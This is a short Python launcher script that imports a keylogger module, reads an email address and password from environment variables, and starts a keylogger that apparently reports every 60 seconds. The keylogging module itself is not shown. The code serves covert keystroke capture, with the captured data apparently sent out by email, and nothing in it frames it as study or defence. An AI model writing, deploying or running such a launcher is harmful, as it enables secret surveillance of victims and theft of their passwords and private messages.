#!/usr/bin/env python3

import keylogger
import os

email = os.getenv('EMAIL')
password = os.getenv('PASSWORD')


my_keylogger = keylogger.Keylogger(60, email, password)
my_keylogger.start()